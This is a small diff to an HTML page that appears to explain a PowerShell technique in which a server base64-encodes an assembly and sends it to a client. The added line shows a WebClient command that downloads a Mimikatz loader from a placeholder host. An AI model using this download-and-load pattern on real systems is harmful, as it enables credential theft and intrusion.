@@ -240,6 +240,7 @@
                                     $assemblyB64 = [System.Convert]::ToBase64String($assemblyByte) <br>
                                     $sw.WriteLine($assemblyB64) # Server sending to the client <br>
                                 </div>
+                                <i>(New-Object Net.WebClient).DownloadData("http://X.X.X.X/LoadMimikatz.exe")</i> could have been used instead of Invoke-WebRequest
 
                                 <i style="color: yellow;">Client code :</i>
                                 <div class="squarebox">
